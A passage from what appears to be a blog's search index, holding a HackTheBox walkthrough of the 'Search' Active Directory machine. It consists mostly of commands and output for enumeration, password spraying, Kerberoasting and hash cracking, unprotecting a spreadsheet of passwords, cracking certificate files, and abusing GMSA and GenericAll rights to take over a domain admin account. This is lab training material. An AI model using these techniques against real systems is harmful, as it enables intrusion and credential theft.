10.","tags":["HTB","smb","smbmap","smbclient","rpcclient","rpc","ldapsearch","password-spray","crackmapexec","evil-winrm","pstranscript","net-use","dnscmd","msfvenom","smbserver","lolbas","winrm","impacket","dnsadmins"],"title":"[HTB] Machine: Resolute"},{"categories":null,"contents":"Search Enumeration nmap └─$ nmap -Pn -p- 10.10.11.129 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST Warning: 10.10.11.129 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.10s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8172/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49702/tcp open unknown 49712/tcp open unknown 49733/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1222.26 seconds └─$ nmap -Pn -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389 -sC -sV 10.10.11.129 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 22:12 BST Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.18s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Search \u0026amp;mdash; Just Testing IIS | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-23 21:12:07Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. | tls-alpn: |_ http/1.1 | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Search \u0026amp;mdash; Just Testing IIS 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. | ssl-cert: Subject: commonName=research | Not valid before: 2020-08-11T08:13:35 |_Not valid after: 2030-08-09T08:13:35 8172/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH | Not valid before: 2020-04-07T09:05:25 |_Not valid after: 2030-04-05T09:05:25 |_http-title: Site doesn\u0026#39;t have a title. |_ssl-date: 2023-09-23T21:13:36+00:00; -41s from scanner time. | tls-alpn: |_ http/1.1 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -40s, deviation: 0s, median: -41s | smb2-time: | date: 2023-09-23T21:13:05 |_ start_date: N/A | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 99.21 seconds smb └─$ smbclient -N -L //search.htb Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to search.htb failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Web Server Ports 80, 443 ldap └─$ ldapsearch -H ldap://search.htb -x -s base namingcontexts # extended LDIF # # LDAPv3 # base \u0026lt;\u0026gt; (default) with scope baseObject # filter: (objectclass=*) # requesting: namingcontexts # # dn: namingcontexts: DC=search,DC=htb namingcontexts: CN=Configuration,DC=search,DC=htb namingcontexts: CN=Schema,CN=Configuration,DC=search,DC=htb namingcontexts: DC=DomainDnsZones,DC=search,DC=htb namingcontexts: DC=ForestDnsZones,DC=search,DC=htb # search result search: 2 result: 0 Success # numResponses: 2 # numEntries: 1 └─$ ldapsearch -H ldap://search.htb -x -b \u0026#34;DC=search,DC=htb\u0026#34; # extended LDIF # # LDAPv3 # base \u0026lt;DC=search,DC=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL # # search result search: 2 result: 1 Operations error text: 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v4563 # numResponses: 1 gobuster └─$ gobuster dir -u http://10.10.11.129/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x aspx,txt --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.129/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: aspx,txt [+] Timeout: 10s =============================================================== 2023/09/24 11:19:03 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.129/images/] /Images (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.129/Images/] /staff (Status: 403) [Size: 1233] /css (Status: 301) [Size: 147] [--\u0026gt; http://10.10.11.129/css/] /js (Status: 301) [Size: 146] [--\u0026gt; http://10.10.11.129/js/] /Staff (Status: 403) [Size: 1233] /fonts (Status: 301) [Size: 149] [--\u0026gt; http://10.10.11.129/fonts/] /IMAGES (Status: 301) [Size: 150] [--\u0026gt; http://10.10.11.129/IMAGES/] └─$ gobuster dir -u https://10.10.11.129/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x aspx,txt --no-error -k =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: https://10.10.11.129/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: aspx,txt [+] Timeout: 10s =============================================================== 2023/09/24 11:20:08 Starting gobuster in directory enumeration mode =============================================================== /images (Status: 301) [Size: 151] [--\u0026gt; https://10.10.11.129/images/] /Images (Status: 301) [Size: 151] [--\u0026gt; https://10.10.11.129/Images/] /css (Status: 301) [Size: 148] [--\u0026gt; https://10.10.11.129/css/] /js (Status: 301) [Size: 147] [--\u0026gt; https://10.10.11.129/js/] /fonts (Status: 301) [Size: 150] [--\u0026gt; https://10.10.11.129/fonts/] /IMAGES (Status: 301) [Size: 151] [--\u0026gt; https://10.10.11.129/IMAGES/] Foothold We have an interesting pic on the website We can try crafting username list and launch crackmapexec └─$ username-anarchy -i user.list \u0026gt; hope.user └─$ cat hope.user hope hopesharp hope.sharp hopeshar hopes h.sharp hsharp shope s.hope sharph sharp sharp.h sharp.hope hs And we find valid creds hope.sharp:IsolationIsKey? └─$ crackmapexec smb search.htb -u hope.user -p \u0026#39;IsolationIsKey?\u0026#39; SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [-] search.htb\\hope:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\hopesharp:IsolationIsKey? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [+] search.htb\\hope.sharp:IsolationIsKey? smb └─$ smbmap -u hope.sharp -p \u0026#39;IsolationIsKey?\u0026#39; -H 10.10.11.129 [+] IP: 10.10.11.129:445 Name: search.htb Disk Permissions Comment ---- ----------- ------- ADMIN$ NO ACCESS Remote Admin C$ NO ACCESS Default share CertEnroll READ ONLY Active Directory Certificate Services share helpdesk NO ACCESS IPC$ READ ONLY Remote IPC NETLOGON READ ONLY Logon server share RedirectedFolders$ READ, WRITE SYSVOL READ ONLY Logon server share User #1 Let\u0026rsquo;s run bloodhound We could also use ldapdomaindump -u search.htb\\\\hope.sharp -p 'IsolationIsKey?' 10.10.11.129 -o search.ldap/ └─$ bloodhound-python -u hope.sharp -p \u0026#39;IsolationIsKey?\u0026#39; -d search.htb -c All -ns 10.10.11.129 --zip INFO: Found AD domain: search.htb INFO: Getting TGT for user INFO: Connecting to LDAP server: research.search.htb INFO: Found 1 domains INFO: Found 1 domains in the forest INFO: Found 113 computers INFO: Connecting to LDAP server: research.search.htb INFO: Found 107 users INFO: Found 64 groups INFO: Found 6 gpos INFO: Found 27 ous INFO: Found 19 containers INFO: Found 0 trusts We have 2 Kerberoastable accounts Let\u0026rsquo;s get web_svc hash └─$ impacket-GetUserSPNs search.htb/hope.sharp -dc-ip 10.10.11.129 -request Impacket v0.11.0 - Copyright 2023 Fortra Password: ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation --------------------------------- ------- -------- -------------------------- --------- ---------- RESEARCH/web_svc.search.htb:60001 web_svc 2020-04-09 13:59:11.329031 \u0026lt;never\u0026gt; [-] CCache file is not found. Skipping... $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$359bc73541e9cf6140199d9f0775794a$0fd56a3a0f5683ac544853c5c92f2b7c74ee9721d8fa760fb87739d6f071d03291db97a743d4e984f059a6bbf72e653efb84d9e45f8148dc948d01dc5ac56975d43d34f33b8a08db1c3c89fb1b92bffbea82b3a6faed6c8366f99f6947a5fdfcdc0d457a6f68fc6acde2763d8205910d2ba80f152ac96b235e49bd5053cd979bb97439b995f89724c984dd0c3fb25a2a85c2bec4cc469b6cc076201bd620faa48c47338de225e7b4f8b97c82e71be514007508225a70f4e80cc5155e606a5568a7ae2ff42986279ef9d8f47a97a2fa5607305e82567624f018fcaaa93f234037b61dc2c3f0b759b457737245a557ea350d07dd10edad172d84756bbe4ee5d47378557c74fed4d97276a203f25ef3a6ea5127e3c4b6a93c2710d7f745d7359386573121e9ad42d91e35ee4ffe1754cea81cce79876fb73b1ab922080b4bae269da2e2680145d305207e80281038b0a5a1a9bd3474a4cedf749aa7294c5395782435ba060508ae74808a8b2f23d4dfac01cf39b7567b605f94dd5ea529cae2940a7eaf5b71a3ff8450f206ef22af7186bbf3d28365263ec9f2c060356a1633259932351831552cc9fbdd3e38694e2cb91e3e0ea8bcfdc82c42dc69bf2348a4b77f98c1872defcc3c7c5dc7614a81d755b75dd162b1847c7a7ae46c207149e257f742e0d979315c8a8ec507b50dc48887075d6f4c0f6a711e35cca2bb0d10d21f8f8841db85ff1790254f2954d97dc3633b7ce0007a6c9575c55cf95982b1db6bf0c5a1e0af4e52249c13c62d670523d4c246fc7a00979fe50bcc5f8db508f0f83a3dbc1a80554fda677ce958fb07916bd696fc3dd37d1cfd50230cf7a7a6ed320c25235147c8e31083089dd4c29b02ee80007a327e165120edd2413bdc604944ef5beb6475b99661a38d51ad72e36325fb5046f262e089c161b7bfbb9106e901e7ca2a53fbca2998cf14f3e3979cd92a2bc6faa9d3b91bb61d1a564b2d2f1e08c649748c2e3b5f48b68faf260e23671d3437c7fd80ae00b36f0d28d4e472f706c0e8018c76536923d3b989056e4505eca1c21a49014289d6f3cad7e7dbf5707319f27979bcb676ef264f6e14175c2890e16413a0e9b2e0b0db93c02e1bf3b9d947b016ac33935f251be0c99299f448d09d8a4d5371b305828f84bfbd0ce24a44008f61a774e18754d3acdec07937b3590ddd831fe0a791658689ceeae2123991dfcdd7d33e55c548720e13428176ef8352ca16a87954f7ab0217006135f5e0d343622ffdb9137fc4f113340fb7cec0c3d0081983912d57c42c40b97e93303c2838e7ce5a6f29148c93be306a754c744654454730813a15f529ac79b555923f7358ae2ac7eddcaccc24d4369239f154c7a514ec6324da28cd1338683cb0dfc37eb3527067ef0fcdcf6ab2be5ba5db214bf2946c24eb7132b4d89904bc02b7446d204dbc823952ee9f86e3e04e61dd76c00f2c8c306ee2 └─$ hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 3.1+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: pthread-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1436/2936 MB (512 MB allocatable), 2MCU ... $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$359bc73541e9cf6140199d9f0775794a$0fd56a3a0f5683ac544853c5c92f2b7c74ee9721d8fa760fb87739d6f071d03291db97a743d4e984f059a6bbf72e653efb84d9e45f8148dc948d01dc5ac56975d43d34f33b8a08db1c3c89fb1b92bffbea82b3a6faed6c8366f99f6947a5fdfcdc0d457a6f68fc6acde2763d8205910d2ba80f152ac96b235e49bd5053cd979bb97439b995f89724c984dd0c3fb25a2a85c2bec4cc469b6cc076201bd620faa48c47338de225e7b4f8b97c82e71be514007508225a70f4e80cc5155e606a5568a7ae2ff42986279ef9d8f47a97a2fa5607305e82567624f018fcaaa93f234037b61dc2c3f0b759b457737245a557ea350d07dd10edad172d84756bbe4ee5d47378557c74fed4d97276a203f25ef3a6ea5127e3c4b6a93c2710d7f745d7359386573121e9ad42d91e35ee4ffe1754cea81cce79876fb73b1ab922080b4bae269da2e2680145d305207e80281038b0a5a1a9bd3474a4cedf749aa7294c5395782435ba060508ae74808a8b2f23d4dfac01cf39b7567b605f94dd5ea529cae2940a7eaf5b71a3ff8450f206ef22af7186bbf3d28365263ec9f2c060356a1633259932351831552cc9fbdd3e38694e2cb91e3e0ea8bcfdc82c42dc69bf2348a4b77f98c1872defcc3c7c5dc7614a81d755b75dd162b1847c7a7ae46c207149e257f742e0d979315c8a8ec507b50dc48887075d6f4c0f6a711e35cca2bb0d10d21f8f8841db85ff1790254f2954d97dc3633b7ce0007a6c9575c55cf95982b1db6bf0c5a1e0af4e52249c13c62d670523d4c246fc7a00979fe50bcc5f8db508f0f83a3dbc1a80554fda677ce958fb07916bd696fc3dd37d1cfd50230cf7a7a6ed320c25235147c8e31083089dd4c29b02ee80007a327e165120edd2413bdc604944ef5beb6475b99661a38d51ad72e36325fb5046f262e089c161b7bfbb9106e901e7ca2a53fbca2998cf14f3e3979cd92a2bc6faa9d3b91bb61d1a564b2d2f1e08c649748c2e3b5f48b68faf260e23671d3437c7fd80ae00b36f0d28d4e472f706c0e8018c76536923d3b989056e4505eca1c21a49014289d6f3cad7e7dbf5707319f27979bcb676ef264f6e14175c2890e16413a0e9b2e0b0db93c02e1bf3b9d947b016ac33935f251be0c99299f448d09d8a4d5371b305828f84bfbd0ce24a44008f61a774e18754d3acdec07937b3590ddd831fe0a791658689ceeae2123991dfcdd7d33e55c548720e13428176ef8352ca16a87954f7ab0217006135f5e0d343622ffdb9137fc4f113340fb7cec0c3d0081983912d57c42c40b97e93303c2838e7ce5a6f29148c93be306a754c744654454730813a15f529ac79b555923f7358ae2ac7eddcaccc24d4369239f154c7a514ec6324da28cd1338683cb0dfc37eb3527067ef0fcdcf6ab2be5ba5db214bf2946c24eb7132b4d89904bc02b7446d204dbc823952ee9f86e3e04e61dd76c00f2c8c306ee2:@3ONEmillionbaby Session..........: hashcat Status...........: Cracked Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP) Hash.Target......: $krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*...306ee2 Time.Started.....: Sun Sep 24 10:38:02 2023 (14 secs) Time.Estimated...: Sun Sep 24 10:38:16 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 829.6 kH/s (0.48ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 11489792/14344385 (80.10%) Rejected.........: 0/11489792 (0.00%) Restore.Point....: 11489280/14344385 (80.10%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: @5945482 -\u0026gt; @143lovelove Hardware.Mon.#1..: Util: 90% Started: Sun Sep 24 10:38:02 2023 Stopped: Sun Sep 24 10:38:17 2023 The creds works for smb web_svc:@3ONEmillionbaby Yet nothing else └─$ crackmapexec smb search.htb -u web_svc -p \u0026#39;@3ONEmillionbaby\u0026#39; SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [+] search.htb\\web_svc:@3ONEmillionbaby Let\u0026rsquo;s try password spraying I\u0026rsquo;ll connect via rpcclient -U 'web_svc' -N search.htb --password='@3ONEmillionbaby' And collect all users with enumdomusers or querydispinfo └─$ crackmapexec smb search.htb -u user.list -p \u0026#39;@3ONEmillionbaby\u0026#39; --continue-on-success SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [-] search.htb\\Administrator:@3ONEmillionbaby STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Guest:@3ONEmillionbaby STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\krbtgt:@3ONEmillionbaby STATUS_LOGON_FAILURE ... SMB search.htb 445 RESEARCH [+] search.htb\\Edgar.Jacobs:@3ONEmillionbaby ... SMB search.htb 445 RESEARCH [+] search.htb\\web_svc:@3ONEmillionbaby SMB search.htb 445 RESEARCH [-] search.htb\\Tristan.Davies:@3ONEmillionbaby STATUS_LOGON_FAILURE We have a new creds Edgar.Jacobs:@3ONEmillionbaby But nothing interesting in bloodhound smbmap shows interesting file inside Edgar\u0026rsquo;s desktop Phishing_Attempt.xlsx └─$ smbmap -u Edgar.Jacobs -p \u0026#39;@3ONEmillionbaby\u0026#39; -H 10.10.11.129 -R \u0026#39;RedirectedFolders$\u0026#39; [+] IP: 10.10.11.129:445 Name: search.htb Disk Permissions Comment ---- ----------- ------- RedirectedFolders$ READ, WRITE .\\RedirectedFolders$\\* ... .\\RedirectedFolders$\\edgar.jacobs\\Desktop\\* dw--w--w-- 0 Mon Aug 10 11:02:16 2020 . dw--w--w-- 0 Mon Aug 10 11:02:16 2020 .. dr--r--r-- 0 Thu Apr 9 21:05:29 2020 $RECYCLE.BIN fr--r--r-- 282 Mon Aug 10 11:02:16 2020 desktop.ini fr--r--r-- 1450 Thu Apr 9 21:05:03 2020 Microsoft Edge.lnk fr--r--r-- 23130 Mon Aug 10 11:30:05 2020 Phishing_Attempt.xlsx User #2 If we open the file, it has interesting Passwords 01082020 tab But the C column is protected We can copy and change the file type from xlsx to zip We follow the [post]](https://yodalearning.com/tutorials/unprotect-excel/) Now open the archive in zip tool and remove protection Remove sheetProtection part And then update it └─$ cp Phishing_Attempt.xlsx Phishing_Attempt_mod.zip Now we change the extension back to xlsx And open the file └─$ mv Phishing_Attempt_mod.zip Phishing_Attempt_mod.xlsx Let\u0026rsquo;s test the creds Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 └─$ crackmapexec smb search.htb -u user.list -p pass.list --no-bruteforce --continue-on-success SMB search.htb 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB search.htb 445 RESEARCH [-] search.htb\\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Cortez.Hickman:..10-time-TALK-proud-66.. STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Bobby.Wolf:??47^before^WORLD^surprise^91?? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Margaret.Robinson://51+mountain+DEAR+noise+83// STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Scarlett.Parks:++47|building|WARSAW|gave|60++ STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Eliezer.Jordan:!!05_goes_SEVEN_offer_83!! STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Hunter.Kirby:~~27%when%VILLAGE%full%00~~ STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [+] search.htb\\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 SMB search.htb 445 RESEARCH [-] search.htb\\Annabelle.Wells:==95~pass~QUIET~austria~77== STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Eve.Galvan://61!banker!FANCY!measure!25// STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Jeramiah.Fritz:??40:student:MAYOR:been:66?? STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Abby.Gonzalez:\u0026amp;\u0026amp;75:major:RADIO:state:93\u0026amp;\u0026amp; STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Joy.Costa:**30*venus*BALL*office*42** STATUS_LOGON_FAILURE SMB search.htb 445 RESEARCH [-] search.htb\\Vincent.Sutton:**24\u0026amp;moment\u0026amp;BRAZIL\u0026amp;members\u0026amp;66** STATUS_LOGON_FAILURE bloodhound shows attack path Get flag from smb └─$ smbclient //10.10.11.129/RedirectedFolders$ -U \u0026#39;sierra.frye%$$49=wide=STRAIGHT=jordan=28$$18\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd sierra.frye\\Desktop smb: \\sierra.frye\\Desktop\\\u0026gt; ls . DRc 0 Thu Nov 18 01:08:00 2021 .. DRc 0 Thu Nov 18 01:08:00 2021 $RECYCLE.BIN DHSc 0 Tue Apr 7 19:03:59 2020 desktop.ini AHSc 282 Fri Jul 31 15:42:15 2020 Microsoft Edge.lnk Ac 1450 Tue Apr 7 13:28:05 2020 user.txt Ac 33 Thu Nov 18 00:55:27 2021 3246079 blocks of size 4096. 762227 blocks available smb: \\sierra.frye\\Desktop\\\u0026gt; more user.txt getting file \\sierra.frye\\Desktop\\user.txt of size 34 as /tmp/smbmore.TW3KdT (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec) smbmap We have a certificates They could be related to search.htb/staff page we saw from gobuster ─$ smbmap -u sierra.frye -p \u0026#39;$$49=wide=STRAIGHT=jordan=28$$18\u0026#39; -H 10.10.11.129 -R \u0026#39;RedirectedFolders$\u0026#39; [+] IP: 10.10.11.129:445 Name: search.htb Disk Permissions Comment ---- ----------- ------- RedirectedFolders$ READ, WRITE ... .\\RedirectedFolders$\\sierra.frye\\Downloads\\Backups\\* dr--r--r-- 0 Mon Aug 10 21:39:17 2020 . dr--r--r-- 0 Mon Aug 10 21:39:17 2020 .. fr--r--r-- 2643 Fri Jul 31 16:04:11 2020 search-RESEARCH-CA.p12 fr--r--r-- 4326 Mon Aug 10 21:39:17 2020 staff.pfx Let\u0026rsquo;s download them └─$ smbclient //10.10.11.129/RedirectedFolders$ -U \u0026#39;sierra.frye%$$49=wide=STRAIGHT=jordan=28$$18\u0026#39; Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; cd sierra.frye\\Downloads smb: \\sierra.frye\\Downloads\\\u0026gt; cd Backups\\ smb: \\sierra.frye\\Downloads\\Backups\\\u0026gt; ls . DHc 0 Mon Aug 10 21:39:17 2020 .. DHc 0 Mon Aug 10 21:39:17 2020 search-RESEARCH-CA.p12 Ac 2643 Fri Jul 31 16:04:11 2020 staff.pfx Ac 4326 Mon Aug 10 21:39:17 2020 3246079 blocks of size 4096. 763285 blocks available smb: \\sierra.frye\\Downloads\\Backups\\\u0026gt; prompt smb: \\sierra.frye\\Downloads\\Backups\\\u0026gt; mget * getting file \\sierra.frye\\Downloads\\Backups\\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (5.2 KiloBytes/sec) (average 5.2 KiloBytes/sec) getting file \\sierra.frye\\Downloads\\Backups\\staff.pfx of size 4326 as staff.pfx (8.7 KiloBytes/sec) (average 6.9 KiloBytes/sec) When I try importing the certificates Both require the password None of the creds we have don\u0026rsquo;t work Let\u0026rsquo;s try cracking the hash using john └─$ pfx2john search-RESEARCH-CA.p12 \u0026gt; search-RESEARCH-CA.p12.hash └─$ pfx2john staff.pfx \u0026gt; staff.pfx.hash └─$ john --wordlist=/usr/share/wordlists/rockyou.txt search-RESEARCH-CA.p12.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status misspissy (search-RESEARCH-CA.p12) 1g 0:00:05:15 DONE (2023-09-24 11:32) 0.003170g/s 17390p/s 17390c/s 17390C/s missprin1956..missnono Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. └─$ john --wordlist=/usr/share/wordlists/rockyou.txt staff.pfx.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status misspissy (staff.pfx) 1g 0:00:05:00 DONE (2023-09-24 11:37) 0.003324g/s 18234p/s 18234c/s 18234C/s missprin1956..missnono Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Now we can import the certs and visit https://search.htb/staff Select the sierra.frye\u0026rsquo;s cert Now we have login page for Windows PowerShell Web Access Use the sierra.frye\u0026rsquo;s creds and research as computer name Root To recap We have ReadGMSAPassword over BIR-ADFS-GMSA BIR-ADFS-GMSA has GenericAll over domain admin TRISTAN.DAVIES Let\u0026rsquo;s retrieve GMSA password https://www.thehacker.recipes/a-d/movement/dacl/readgmsapassword Set TRISTAN.DAVIES\u0026rsquo;s password https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces#genericall-on-user We can use Set-ADAccountPassword Check with crackmapexec └─$ crackmapexec smb 10.10.11.129 -u tristan.davies -p \u0026#39;P@ssw0rd123\u0026#39; SMB 10.10.11.129 445 RESEARCH [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False) SMB 10.10.11.129 445 RESEARCH [+] search.htb\\tristan.davies:P@ssw0rd123 (Pwn3d!) psexec didn\u0026rsquo;t work, but wmiexec does the job ","date":"September 1, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/search/images/search.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/search/","summary":"Search Enumeration nmap └─$ nmap -Pn -p- 10.10.11.129 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 21:42 BST Warning: 10.10.11.129 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.129 (10.10.11.129) Host is up (0.10s latency). Not shown: 65514 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 443/tcp open https 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 8172/tcp open unknown 9389/tcp open adws 49667/tcp open unknown 49675/tcp open unknown 49676/tcp open unknown 49702/tcp open unknown 49712/tcp open unknown 49733/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 1222.","tags":["HTB","domain-controller","active-directory","vhosts","credentials","smbmap","smbclient","password-spray","rpcclient","ldapsearch","ldapdomaindump","bloodhound-py","bloodhound","kerberoast","hashcat","crackmapexec","msoffice","office","excel","certificate","pfx2john","firefox-certificate","certificate","client-certificate","powershell-web-access","gmsa"],"title":"[HTB] Machine: Search"},{"categories":null,"contents":"SecNotes Enumeration nmap └─$ nmap -Pn -p- 10.10.10.97 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-02 